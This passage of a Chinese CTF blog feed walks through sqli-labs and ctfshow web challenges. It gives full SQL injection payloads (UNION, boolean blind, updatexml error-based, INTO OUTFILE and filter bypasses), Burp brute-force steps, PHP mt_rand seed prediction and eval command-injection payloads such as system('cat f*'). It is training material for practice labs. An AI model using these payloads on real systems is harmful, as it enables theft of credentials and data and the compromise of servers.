<p><code>'security'</code>：指定要查询的数据库名称（这里是 <code>security</code>）。</p>
</li>
</ul>
<p>?id=-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’–+</p>
<p><strong>爆段名</strong>，该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。<strong>注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</strong></p>
<p>?id=-1’ union select 1,2,group_concat(username ,id , password) from users–+</p>
<p>得到该字段对应的内容</p>
<h1>二</h1>
<p>这里的步骤与第一关相同，只不过注入方式变成了数字型注入</p>
<p>当我们传入?id=1’时发现他进行了报错，说明这里是数字型注入，字符型注入需要’进行闭环</p>
<p>?id=1 order by 3<br>
?id=-1 union select 1,2,3<br>
?id=-1 union select 1,database(),version()<br>
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’<br>
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’<br>
?id=-1 union select 1,2,group_concat(username ,id , password) from users</p>
<h1>三</h1>
<p>当我们查看是那种注入时，发现字符型会报错，报错后面的内容当中有一个反括号</p>
<p>所以这里我们既需要单引号，又需要反括号</p>
<p>?id=1’) order by 3–+<br>
?id=-1’) union select 1,2,3–+<br>
?id=-1’) union select 1,database(),version()–+<br>
?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+<br>
?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’–+<br>
?id=-1’) union select 1,2,group_concat(username ,id , password) from users–+</p>
<h1>四</h1>
<p>双引号和反括号</p>
<p>?id=1&quot;) order by 3–+<br>
?id=-1&quot;) union select 1,2,3–+<br>
?id=-1&quot;) union select 1,database(),version()–+<br>
?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+<br>
?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’–+<br>
?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users–+</p>
<h2 id="一到四用的是联合注入，但是联合注入需要有回显">一到四用的是联合注入，但是联合注入需要有回显</h2>
<h1>五</h1>
<p>第五道题只有对错回显，要用到布尔盲注。布尔盲注主要用到length(),ascii() ,substr()，首先通过length()函数确定长度再通过另外两个确定具体字符是什么</p>
<p>?id=1’and length((select database()))=8–+</p>
<p>我们知道?id=1是有回显的，那么我们用逻辑运算and，and之前肯定是true，and后面的东西就是我们要测试的了。</p>
<p>大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</p>
<p><code>select database()</code>：这是一个 SQL 语句，用于获取当前正在使用的数据库名称。</p>
<p>substr(“78909”,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii码，这样我们可以很好确定数字根据数字找到对应的字符。b站有视频解析方法</p>
<h2 id="补充一下mysql当中的函数">补充一下mysql当中的函数</h2>
<p>concat()	将多个字符串连接成一个字符串</p>
<h3 id="concat-str1-str2-…">concat(str1,str2,…)</h3>
<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT(&#x27;张三&#x27;,&#x27;李四&#x27;,&#x27;王五&#x27;);</span><br><span class="line">result&gt; 张三李四王五</span><br><span class="line">//——————————————————————————————————————————————</span><br><span class="line">mysql&gt; SELECT CONCAT(&#x27;张三&#x27;,&#x27;李四&#x27;,NULL);</span><br><span class="line">result&gt; NUll</span><br></pre></td></tr></table></figure>
<h3 id="concat-ws">concat_ws()</h3>
<p>和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
<p>concat_ws(separator,str1,str2,…)</p>
<p>说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//默认分隔符为逗号</span><br><span class="line">mysql&gt; SELECT CONCAT_WS(&#x27;,&#x27;,&#x27;张三&#x27;,&#x27;李四&#x27;,&#x27;王五&#x27;);</span><br><span class="line">result&gt; 张三,李四,王五</span><br><span class="line">//和MySQL中CONCAT函数不同的是, CONCAT_WS函数在执行的时候,不会因为NULL值而返回NULL </span><br><span class="line">mysql&gt; SELECT CONCAT_WS(&#x27;,&#x27;,&#x27;张三&#x27;,NULL,&#x27;王五&#x27;);</span><br><span class="line">result&gt; 张三,王五</span><br></pre></td></tr></table></figure>
<h3 id="group-concat">group_concat()</h3>
<p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
<p>这里用<strong>报错注入</strong></p>
<p>常用报错函数</p>
<ul>
<li>updatexml() 是mysql对xml文档数据进行查询和修改的xpath函数</li>
<li>extractvalue() 是mysql对xml文档数据进行查询的xpath函数</li>
<li>floor() mysql中用来取整的函数</li>
<li>exp() 此函数返回e(自然对数的底)指数X的幂值</li>
</ul>
<p>updatexml报错注入–常用</p>
<p><strong>原理</strong>：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。</p>
<p><strong>updatexml</strong>(xml_doument,XPath_string,new_value)<br>
第一个参数：XML的内容<br>
第二个参数：是需要update的位置XPATH路径<br>
第三个参数：是更新后的内容<br>
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式。</p>
<p>输入内容不符合xpath语法就报错了，我们注入利用的就是这一点</p>
<p>?id=1</p>
<p>?id=1’</p>
<p>?id=1’ order by 4–+</p>
<p>?id=1’ and updatexml(1,concat(0x3e,database(),‘&lt;’),1)–+</p>
<p>?id=1’ and updatexml(1,concat(0x3e,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’),0x3e),1)–+</p>
<p>使用updatexml函数，达成报错注入的前提</p>
<p>用concat拼接内容</p>
<p>?id=1’ and updatexml(1,concat(‘&gt;’,(select group_concat(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’),‘&lt;’),1)–+</p>
<p>这里用逻辑and打开users，如果像之前那样就打不开，好像使用逻辑and是完整的句子</p>
<p>?id=1’ and updatexml(1,concat(‘&gt;’,(select group_concat(password) from users),‘&lt;’),1)–+</p>
<p>或者</p>
<p>?id=1’ and updatexml(1,concat(‘&gt;’,(select password from users limit 1,1),‘&lt;’),1)–+</p>
<p>使用limit的原因是返回的结果超过一行：Subquery returns more than 1 row</p>
<h1>六</h1>
<p>道理同五</p>
<p>?id=1</p>
<p>?id=1&quot;</p>
<p>?id=3&quot; order by 3–+</p>
<p>?id=1&quot; and updatexml(1,concat(‘&gt;’,(select group_concat(table_name) from information_schema.tables where table_schema=‘security’ ),‘&lt;’),1) --+</p>
<p>?id=1&quot; and updatexml(1,concat(‘&gt;’,(select group_concat(column_name) from information_schema.columns where table_schema=‘security’ and table_name=‘users’),‘&lt;’),1) --+</p>
<p>?id=1&quot; and updatexml(1,concat(‘&gt;’,(select password from users limit 0,1),‘&lt;’),1) --+</p>
<h1>七</h1>
<p>正确返回You are in… Use outfile…</p>
<p>错误返回You have an error in your SQL syntax</p>
<p>?id=1’–+</p>
<p>返回错误，说明是有’</p>
<p>接下来看括号</p>
<p>?id=1’)) --+</p>
<p>传入两个反括号时回显正常</p>
<p>这一关布尔盲注仍然可以使用</p>
<p>这里使用导出文件</p>
<h2 id="1-导出文件就是可以向服务器写入文件-但是利用的时候要知道数据库-网站的路径">1.导出文件就是可以向服务器写入文件,但是利用的时候要知道数据库,网站的路径</h2>
<p>因为这一关无法拿到回显，所以就无法拿到路径</p>
<p>我们可以去第一关拿到路径</p>
<p><strong>@@datadir</strong>获取数据库存储数据路径 ，<strong>@@basedir</strong>是MYSQL获取安装路径</p>
<p><a href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1</a>’ union select 1,2,@@datadir --+</p>
<p>D:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\data\</p>
<p>@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下</p>
<p>结合@@datadir我们可以推断出网站的绝对路径为</p>
<p>D:\phpstudy\www\</p>
<h2 id="2-读写权限测试">2.读写权限测试</h2>
<p>id=1’)) and (select count(*) from mysql.user)&gt;0 --+</p>
<p>如果返回正常则有读取权限</p>
<h1>web171</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>我们填进去的东西是&quot;.$_GET[‘id’].&quot;这一部分。</p>
<p>我们查看一下所有的东西，总共有24个</p>
<p>那我们传进去999’ or id='25</p>
<p>发现什么都没有，那id是不是不是25？</p>
<p>999’ or id='26</p>
<p>ctfshow{8d8e3e69-a372-4436-a1dc-2466b32ce185}</p>
<p>或者1’or '1=1全部爆出来</p>
<h1>web172</h1>
<p>上题方法不行，用正常方法</p>
<p>1’ union select database(),group_concat(table_name),3 from information_schema.tables where table_schema=‘ctfshow_web’–+</p>
<p>发现有一个ctfshow_user2那么flag应该在这里面</p>
<p>1’ union select database(),2,group_concat(column_name) from information_schema.columns where table_name=‘ctfshow_user2’–+</p>
<p>1’ union select database(),2,group_concat(id,username,password) from ctfshow_user2–+</p>
<p>ctfshow{00ab3cb2-1760-47d6-9e65-692165dcf191}</p>
<h1>web173</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<p>由此可知，返回结果当作不应该出现flag字样，我们只把后面的username去掉就可以了</p>
<p>1’ union select database(),group_concat(table_name),3 from information_schema.tables where table_schema=‘ctfshow_web’–+</p>
<p>发现有一个ctfshow_user3那么flag应该在这里面</p>
<p>1’ union select database(),2,group_concat(column_name) from information_schema.columns where table_name=‘ctfshow_user3’–+</p>
<p>1’ union select database(),2,group_concat(id,password) from ctfshow_user3–+</p>
<p>ctfshow{d79f6a15-c491-4716-b31e-0c15a6e05643}</p>
<h1>web174</h1>
<p>返回结果当中不能有flag字样和数字</p>
<p>用replace替换返回flag结果当中的数字</p>
<p>to_base64(password)</p>
<p>-1’ union select  replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),2,‘testb’) ,3,‘testc’) ,4,‘testd’) ,5,‘teste’) ,6,‘testf’) ,7,‘testg’) ,8,‘testh’) ,9,‘testi’) ,0,‘testj’) ,1,‘testa’),replace(1,‘1’,‘testa’) from ctfshow_user4 where username=‘flag’–+</p>
<p>YtestcRmctestbhvdtestctmOWJlNmIyNytestjzODIyLTQyNjgtOTZkNytestjtestdZmEyOWMtestbMDFmYThtesti</p>
<p>Y3Rmc2hvd3tmOWJlNmIyNy0zODIyLTQyNjgtOTZkNy04ZmEyOWM2MDFmYTh9</p>
<p>ctfshow{f9be6b27-3822-4268-96d7-8fa29c601fa8}</p>
<h1>web175</h1>
<h2 id="x00-x7f-的含义"><strong><code>[\x00-\x7f]</code> 的含义</strong></h2>
<ul>
<li>
<p><code>\x00</code> 代表 <strong>ASCII 码 0（空字符 <code>NULL</code>）</strong></p>
</li>
<li>
<p><code>\x7f</code> 代表 <strong>ASCII 码 127（<code>DEL</code> 控制字符）</strong></p>
</li>
<li>
<pre><code>[\x00-\x7f]
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   表示匹配 </span><br><span class="line"></span><br><span class="line">  所有 ASCII 码 0-127 之间的字符</span><br><span class="line"></span><br><span class="line">  - 包括 **英文字符、数字、符号** 以及 **控制字符**</span><br><span class="line">  - **不包括** 非 ASCII 字符（如中文、日文、韩文、特殊符号）</span><br><span class="line"></span><br><span class="line">将数据输出到一个文件中，然后访问对应文件</span><br><span class="line"></span><br><span class="line">-1&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span><br><span class="line"></span><br><span class="line">ctfshow&#123;90c0a2ed-2a6a-45ac-b6f4-5c61812ca570&#125;</span><br><span class="line"></span><br><span class="line"># web176</span><br><span class="line"></span><br><span class="line">1&#x27; or 1=1--+</span><br><span class="line"></span><br><span class="line">ctfshow&#123;0d0d29c4-c17c-4a12-b294-574bbca66f31&#125;</span><br><span class="line"></span><br><span class="line"># web177</span><br><span class="line"></span><br><span class="line">这里通过自行测试过滤了空格，可以用/**/代替</span><br><span class="line"></span><br><span class="line">1&#x27;or/**/1=1%23</span><br><span class="line"></span><br><span class="line">%23是#</span><br><span class="line"></span><br><span class="line">ctfshow&#123;405ab7d6-0176-4a2b-b7c5-320dd8b32529&#125;</span><br><span class="line"></span><br><span class="line"># web178</span><br><span class="line"></span><br><span class="line">这里似乎是过滤了空格，我这里用%09代替</span><br><span class="line"></span><br><span class="line">1&#x27;%09union%09select%091,database(),group_concat(password)%09from%09ctfshow_user%23</span><br><span class="line"></span><br><span class="line">或者1&#x27;%09or%091=1%23一下拿到</span><br><span class="line"></span><br><span class="line">ctfshow&#123;a448625d-1474-4b15-90b7-8cd2d315ae54&#125;</span><br><span class="line"></span><br><span class="line"># web179</span><br><span class="line"></span><br><span class="line">这里还%09过滤了，%0c可以</span><br><span class="line"></span><br><span class="line">1&#x27;%0cor%0c1=1%23</span><br><span class="line"></span><br><span class="line">ctfshow&#123;73c4dc08-b1df-4e9f-b961-07c022c22454&#125;</span><br><span class="line"></span><br><span class="line"># web180</span><br><span class="line"></span><br><span class="line">id=-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">SELECT id, username, password </span><br><span class="line">FROM ctfshow_user </span><br><span class="line">WHERE username != &#x27;flag&#x27; </span><br><span class="line">AND id = &#x27;-1&#x27; OR (id=26) AND &#x27;1&#x27;=&#x27;1&#x27; </span><br><span class="line">LIMIT 1;</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
<p><code>id=26</code> 如果有数据，则 <code>(id=26) AND ('1'='1')</code> 为 <code>TRUE</code>。</p>
<p>ctfshow{07b73d20-9062-43c3-8cae-1c4d53f793e5}</p>
<h1>web181</h1>
<p>同180</p>
<h1>web182</h1>
<p>同180</p>
<h1>总结</h1>
<p>concat(‘&gt;’,id,username,password,level,‘&lt;’)</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>web12-20</title>
    <url>/2025/01/19/web12-20/</url>
    <content><![CDATA[<h1>Web12</h1>
<p>提示:有时候网站上的公开信息，就是管理员常用密码</p>
<p>主要考察收集信息和大胆猜测的能力</p>
<p>Robots.txt</p>
<p>/admin/</p>
<p>User:admin</p>
<p>Passwd:372619038(在页面的最下面)</p>
<p>ctfshow{5fae3c78-7d0c-4749-ba24-fa0a6bbe9cdd}</p>
<h1>Web13</h1>
<p>提示;技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
<p>页面下面的document点进去出现账号密码和url</p>
<p>ctfshow{eb6944f6-439f-40a9-bdb2-1b15750377d8}</p>
<h1>Web14</h1>
<p>提示:有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
<p>我们看源码，搜索editor发现是一个图片，再通过wp进入了editor</p>
<p>联想到：页面的设计编辑当中出现的图片是通过一个画图工具显示的，那么这个画图工具一定可以查看当前所有目录。</p>
<p>那么，我们就把flag所在的目录搞到url就可以</p>
<p>Wp说的原理</p>
<p><img src="wps8.jpg" alt="img"></p>
<h1>Web15</h1>
<p>提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
<p>这道题我们可以通过utl/admin进入后台，然后账号应该是admin，密码不知道，但是重置密码里面可以重置，但是要重置密码需要作者所居住的城市，我们可以通过页面下面作者的qq邮箱搜索他的qq（25.1.16截至今天已经搜不到了），不过不妨碍做题，是西安，密码重置了之后登录进去</p>
<p>ctfshow{d95e4ba6-fa90-40ee-9835-f68407fb8f9b}</p>
<h1>Web16</h1>
<p>提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<p>PHP探针：php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。输入URL/tz.php 即可打开雅黑PHP探针</p>
<p><img src="wps9.jpg" alt="img"></p>
<p>点进phpinfo，查看php信息，然后搜索ctf</p>
<p>ctfshow{1b1ba394-e6ac-40fa-a0a2-aec94f57f917}</p>
<h1>Web17</h1>
<p>提示：备份的sql文件会泄露敏感信息</p>
<p>Url/backup.sql</p>
<p>ctfshow{dfca4269-062e-4c5f-9140-3de1758c32a5}</p>
<h1>Web18</h1>
<p>游戏题，太好了，我是傻逼，就喜欢这种题</p>
<p>查看js文件，找目标</p>
<p>if(score&gt;100)</p>
<p>{</p>
<p>var result=window.confirm(“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”);</p>
<p>}</p>
<p>复制里边的东西，然后运行</p>
<p><img src="wps10.jpg" alt="img"></p>
<p>去看看url/110.php</p>
<p>ctfshow{0869ea96-75f4-4b14-87cd-48e8f6d4cce1}</p>
<h1>Web19</h1>
<p>提示：密钥什么的，就不要放在前端了</p>
<p><img src="wps11.jpg" alt="img"></p>
<p>用hackebar</p>
<p>方法一：Username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
<p>在原来的登录界面不行，因为没有解密啥的（后来知道他是在登录界面又加密了一下，所以要解密一下源码里面的），但是为啥在hackbar的post就可以</p>
<p>方法二：</p>
<p>解码然后在登录界面提交</p>
<p>这是什么解码？复制给ai问ai</p>
<p>解出来是</p>
<p>i_want_a_36d_girl</p>
<p>出题人脑子也纯有冰</p>
<p>ctfshow{c155ec3f-a3e9-44dc-84d6-03cd726e5751}</p>
<h1>Web20</h1>
<p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
<p>url/db/db.mdb下载文件</p>
<p>flag{ctfshow_old_database}</p>
<h1>12-20总结</h1>
<p>1.后台登录界面url/robots.txt</p>
<p>2.尾页documen里面会有账号密码之类的<br>
3.网页图片editor浏览所有文件<br>
4.Php探针，url/tz.php然后就是进去phpinfo<br>
5.sql文件泄露url/backup.sql<br>
6.游戏找js文件<br>
7.密钥类的用hackbar或者自行ai解码</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>web21-30</title>
    <url>/2025/01/19/web21-30/</url>
    <content><![CDATA[<h1><strong>Web21</strong></h1>
<p>有一点真麻烦</p>
<img src="image-20250119202523975.png" alt="image-20250119202523975" style="zoom:25%;">
<p>Bp抓包</p>
<p>发送给intruder</p>
<p>添加账号密码哪里</p>
<p><img src="wps12.jpg" alt="img"></p>
<p>用自定义迭代器(Custom Iterator)</p>
<p>payload配置当中</p>
<p>位置1添加admin</p>
<p><img src="wps13.jpg" alt="img"></p>
<p>位置2添加英文冒号</p>
<p><img src="wps14.jpg" alt="img"></p>
<p>位置3添加下载的附件</p>
<p><img src="wps15.jpg" alt="img"></p>
<p>Payload处理当中选择</p>
<p><img src="wps16.jpg" alt="img"></p>
<p>对我们添加的东西进行base64加密</p>
<p>关闭对勾</p>
<p><img src="wps17.jpg" alt="img"></p>
<p>开始破解</p>
<p>点击状态码</p>
<p><img src="wps18.jpg" alt="img"></p>
<p>第一个就是账号和密码</p>
<p>解码出来是</p>
<p><img src="wps19.jpg" alt="img"></p>
<p>admin:shark63</p>
<p>ctfshow{fb4fe60a-bc16-4982-92df-439262c04233}</p>
<h1><strong>Web22</strong></h1>
<p>没有靶机，自行wp</p>
<h1><strong>Web23</strong></h1>
<p><img src="wps20.jpg" alt="img"></p>
<p>根据源码可知，需要token为特定的值才可以得到flag</p>
<p>Token里面应该是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</p>
<p>当中任意的几个的结合体</p>
<p>Wp里面假设了三个，php脚本为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">print (strlen($string).&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for ($a = 0; $a &lt; 62; $a++) &#123;</span><br><span class="line"></span><br><span class="line">  for ($b = 0; $b &lt; 62; $b++) &#123;</span><br><span class="line"></span><br><span class="line">​    for ($c = 0; $c &lt; 62; $c++) &#123;</span><br><span class="line"></span><br><span class="line">​      $flag = $string[$a] . $string[$b] . $string[$c];</span><br><span class="line"></span><br><span class="line">​      $token = md5($flag);</span><br><span class="line"></span><br><span class="line">​      if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) &#123;</span><br><span class="line"></span><br><span class="line">​        if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) &#123;</span><br><span class="line"></span><br><span class="line">​          echo $flag . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>答案有很多个a6e就是其中一个</p>
<p>但是也可以是2位的token</p>
<p>使用bp暴力破解出现3j</p>
<p><img src="wps21.jpg" alt="img"></p>
<p>这里要点击length</p>
<p><img src="wps22.jpg" alt="img"></p>
<p>同理用bp破解三位数也一样，但是四位数就比较耗费时间了，毕竟是暴力破解嘛</p>
<p><img src="wps23.jpg" alt="img"></p>
<p>ctfshow{83a47257-9025-4ea9-acb8-f7d5cbe4d541}</p>
<h1><strong>Web24</strong></h1>
<p>知识：伪随机数</p>
<p>我们先了解一下怎样生成随机数</p>
<?php

  echo intval(mt_rand());

?>
<p>Intval()函数，将浮点数、布尔值转化为整数或0、1</p>
<p>mt_rand()函数，会根据系统时间或者其他东西来产生随机数</p>
<p>在本题中出现了mt_srand()函数mt_srand(372619038);</p>
<p>其中的数字是seed种子，一旦使用了此函数，在之后的mt_rand()函数将基于该种子生成随机数，如果这里的种子不变，那么生成的随机数也会固定不变（因为生成随机数的算法不会变）</p>
<p>那么我们通过运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line"></span><br><span class="line">  mt_srand(372619038);</span><br><span class="line"></span><br><span class="line">  echo intval(mt_rand());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到的数字1155388967就可以拿到flag</p>
<p>ctfshow{dddab7e5-2562-455d-9156-17542fe2507a}</p>
<h1><strong>Web25</strong></h1>
<p>$rand = intval($r)-intval(mt_rand());</p>
<p>当r=0时</p>
<p>Rand=-448251818</p>
<p>那么，mt_rand=448251818</p>
<p>这里需要反推出seed，下载php_mt_seed，拖进去ubuntu。对了，还需要php的版本，我们抓包看看响应头  PHP/7.3.11</p>
<p>在ubuntu运行脚本查看seed：928309670或者4126709391</p>
<p>在这里面运行（后一个seed正确）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(seed);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>
<p>得</p>
<p>448251818</p>
<p>614468087</p>
<p>Url/r=448251818  cookie=token=614468087</p>
<p>ctfshow{3944ae31-389f-4695-92fb-7791162db256}</p>
<h1><strong>Web26</strong></h1>
<p>进去之后是个下载的什么什么的东西</p>
<p>还有账号密码，应该是破解密码的</p>
<p>Bp抓包爆破7758521</p>
<p>ctfshow{9a82e93f-9eea-4340-8754-e2a1559f75cf</p>
<h1><strong>Web27</strong></h1>
<p>点击录取名单，有一个表格，那就从第一个人下手</p>
<p>高先伊621022********5237</p>
<p>很明显，这里需要bp暴力破解，注意抓post包</p>
<p>发送给intruder</p>
<p><img src="wps24.jpg" alt="img"></p>
<p><img src="wps25.jpg" alt="img"></p>
<p><img src="wps26.jpg" alt="img"></p>
<p>02015237</p>
<p>621022199002015237</p>
<p>ctfshow{45f62eec-3f98-4f37-a99e-2e564ac70f4f}</p>
<h1><strong>Web28</strong></h1>
<p>爆破目录</p>
<p><img src="wps27.jpg" alt="img"></p>
<p>换成集束炸弹模式，选中1 2，并把后面的2.txt删掉，右边1和2都从0到100，出来后点状态码，然后点响应就可以了</p>
<p><img src="wps28.jpg" alt="img"></p>
<p>ctfshow{d70041f1-624c-4a40-88ae-1a720cbb9e35}</p>
<h1>Web29</h1>
<p><img src="wps29.jpg" alt="img"></p>
<p>解释代码：</p>
<p>error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)，即不显示 PHP 运行过程中可能产生的错误信息。这样做可能是为了避免在某些情况下向用户暴露敏感信息，但在开发和调试阶段，通常不建议关闭错误报告，以便及时发现和解决问题。</p>
<p>if(isset($_GET[‘c’])){：isset()函数用于检查变量是否已设置且非null。这里是检查$_GET超全局数组中是否存在键为’c’的元素。如果存在，就执行下面的代码块。</p>
<p>$c = $_GET[‘c’];：将$_GET[‘c’]的值赋给变量$c，以便后续使用。</p>
<p>if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配。这里的正则表达式&quot;/flag/i&quot;表示不区分大小写地匹配字符串&quot;flag&quot;。!表示取反，即如果$c的值不包含（不区分大小写）“flag”，则执行下面的eval($c);语句。</p>
<p>eval($c);：eval()函数会将传入的字符串作为 PHP 代码执行。这是一个非常强大但也很危险的函数，因为如果传入的字符串来自不可信的来源（例如用户输入），可能会导致安全漏洞，如代码注入攻击。</p>
<p>总的来说：我们需要get一个命令，让它出现flag。然而，他又过滤了flag这四个字符，那怎么办？</p>
<p>\1. 使用Linux通配符，我们可以这样构造payload：?c=system(‘cat f*’);或者?c=system(‘cat [f]*’);然后查看源码得到flag，或者抓包看到flag</p>
<p>\2. ?c=system(“cat *.php&gt;&gt;1.txt”);把所有以php结尾的文件都写进一个txt</p>
<p>ctfshow{cd997bb9-1ab7-48a7-819a-c5e9856aedc3}</p>
<p>插入一点知识:</p>
<p>\1.  ?c=phpinfo();当中的disable_functions</p>
<p><img src="wps30.jpg" alt="img"></p>
<p>后面没有任何的值，也就是说，这里没有禁用任何的函数。那么我们就可以使用system函数来输出flag</p>
<p>\2.  ?c=system(‘ls’);看到有flag.php和index.php两个文件，那么我们想一想，能不能单独显示出来flag.php，然后前面加上一个cat？</p>
<p>scandir(“.”)扫描当前目录，但没有回显</p>
<p>套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
<p>那么，有了flag.php这个整体，那前面拼接一个cat是不是就可以了？</p>
<p>知识有限，止步于此</p>
<h1>Web30</h1>
<p>shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令</p>
<p>反引号和shell_exec()函数同理</p>
<p>?c=echo <code>cat f*</code>;看源码出flag</p>
<p>?c=passthru(‘cat f*’);</p>
<p>这里呢？哈哈哈哈，卢本伟：**</p>
<p>万能办法&gt;&gt;和cp(复制，和&gt;&gt;差不多)用法cp flag.php 1.txt</p>
<p>?c=echo <code>cat [f]*</code>;注意看源代码，你看你的软件，肯定没回显的</p>
<p>?c=echo <code>cat [f]* &gt;&gt; 1.txt</code>;</p>
<p>ctfshow{e6cce2cc-a5dc-4e88-ba65-3cc8d4620046}</p>
<h1>总结21-30</h1>
<p>1.bp当中的intruder为爆破部分</p>
<p>2.自定义迭代器(Custom Iterator):可以自动替换测试，而且可以添加前后缀，结果可以通过base64等加密一下</p>
<p>3.特定字符串内容一般abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789其中几个字符组成的，可以通过编写脚本得出需要的特定字符串</p>
<p>4.伪随机数mt_srand()和mt_srand(seed);产生的随机数是固定的。seed为数字串</p>
<p>5.intruder 当中有集束炸弹模式，可以选中多个部分进行爆破</p>
<p>6.if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配</p>
